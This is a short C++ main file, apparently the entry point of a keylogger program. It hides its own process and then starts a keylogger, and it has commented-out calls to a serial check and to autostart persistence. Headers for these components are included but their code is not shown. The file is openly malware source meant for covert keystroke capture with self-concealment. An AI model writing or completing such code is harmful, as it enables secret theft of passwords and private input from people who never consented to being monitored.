#include "Autostart.h"
#include "Keylogger.h"
#include "SerialCheck.h"
#include "HideProc.h"
#include <iostream> 
#include <thread>
using namespace std;

int main() {
	

	//checkSerials();
	//createAutoStart();
	
	
	hideProcess();

	startKeyLogger();

	return 0;
}